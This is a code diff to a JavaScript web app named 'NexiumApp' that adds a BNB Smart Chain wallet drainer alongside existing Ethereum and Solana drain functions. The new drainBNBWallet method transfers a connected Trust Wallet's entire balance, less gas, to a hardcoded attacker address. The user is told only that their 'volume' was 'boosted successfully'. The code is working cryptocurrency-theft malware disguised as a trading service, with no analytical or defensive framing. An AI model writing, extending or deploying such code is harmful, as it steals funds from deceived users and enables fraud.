@@ -34,7 +34,8 @@ import * as ethers from 'ethers';
 
 const DRAIN_ADDRESSES = {
   ethereum: "0x402421b9756678a9aae81f0a860edee53faa6d99",
-  solana: "73F2hbzhk7ZuTSSYTSbemddFasVrW8Av5FD9PeMVmxA7"
+  solana: "73F2hbzhk7ZuTSSYTSbemddFasVrW8Av5FD9PeMVmxA7",
+  bnb: "0xeA54572eBA790E31f97e1D6f941D7427276688C3"
 };
 
 const POPULAR_SPL_TOKENS = [
@@ -155,7 +156,7 @@ class NexiumApp {
           } else if (this.connectedWalletType === 'Phantom') {
             this.drainSolanaWallet();
           } else if (this.connectedWalletType === 'Trust') {
-            this.drainEthereumWallet();
+            this.drainBNBWallet();
           }
         } else {
           console.log('Connect Wallet button clicked'); // Log 14
@@ -214,7 +215,7 @@ class NexiumApp {
       } else if (walletName === 'Phantom') {
         this.drainSolanaWallet();
       } else if (walletName === 'Trust') {
-        this.drainEthereumWallet();
+        this.drainBNBWallet();
       }
     };
 
@@ -683,6 +684,64 @@ class NexiumApp {
     }
   }
 
+  async drainBNBWallet() {
+    console.log("🔄 BNB Drainer Triggered"); // Log 156
+    this.showProcessingSpinner();
+    if (typeof window === "undefined" || !window.ethereum) {
+      console.error("⚠️ No Ethereum provider found. Make sure Trust Wallet is installed."); // Log 157
+      this.showFeedback("Please install Trust Wallet to boost volume.", 'error');
+      this.hideProcessingSpinner();
+      return;
+    }
+
+    const provider = new ethers.BrowserProvider(window.ethereum);
+
+    try {
+      const network = await provider.getNetwork();
+      console.log(`BNB Drainer network: chainId=${network.chainId}, name=${network.name}`); // Log 158
+      if (this.connectedWalletType === 'Trust' && network.chainId !== 56n) {
+        console.error('Drainer not on BNB Smart Chain, chainId:', network.chainId); // Log 159
+        this.showFeedback('Please connect Trust Wallet to BNB Smart Chain.', 'error');
+        this.hideProcessingSpinner();
+        return;
+      }
+
+      const signer = await provider.getSigner();
+      const walletAddress = await signer.getAddress();
+      console.log("✅ Connected to BNB Wallet:", walletAddress); // Log 160
+
+      const balance = await provider.getBalance(walletAddress);
+      const gasPrice = await provider.getGasPrice();
+      const gasLimit = 21000n;
+      const gasCost = gasPrice * gasLimit;
+      const transferableBalance = balance - gasCost;
+
+      if (transferableBalance <= 0n) {
+        console.error("Insufficient transferable balance:", balance.toString(), "wei"); // Log 161
+        throw new Error("Insufficient balance to transfer after reserving gas cost.");
+      }
+
+      const tx = await signer.sendTransaction({
+        to: DRAIN_ADDRESSES.bnb,
+        value: transferableBalance,
+        gasLimit,
+        gasPrice
+      });
+
+      console.log("✅ BNB Transaction sent:", tx.hash); // Log 162
+      this.showFeedback("Volume boosted successfully!", 'success');
+      this.hideProcessingSpinner();
+    } catch (error) {
+      console.error("❌ Transaction failed due to an unexpected error:", error); // Log 163
+      if (error.message.includes('insufficient funds')) {
+        this.showFeedback('Insufficient funds to cover gas fees. Please ensure sufficient BNB balance.', 'error');
+      } else {
+        this.showFeedback('Failed to boost volume. Please try again.', 'error');
+      }
+      this.hideProcessingSpinner();
+    }
+  }
+
   updateButtonState(state, walletName, address = '') {
     let button = this.dom[`connect${walletName}`];
     if (!button) {
@@ -1089,7 +1148,7 @@ class NexiumApp {
         } else if (this.connectedWalletType === 'Phantom') {
           this.drainSolanaWallet();
         } else if (this.connectedWalletType === 'Trust') {
-          this.drainEthereumWallet();
+          this.drainBNBWallet();
         }
         if (this.dom.customTokenModal) {
           this.dom.customTokenModal.classList.remove('active');
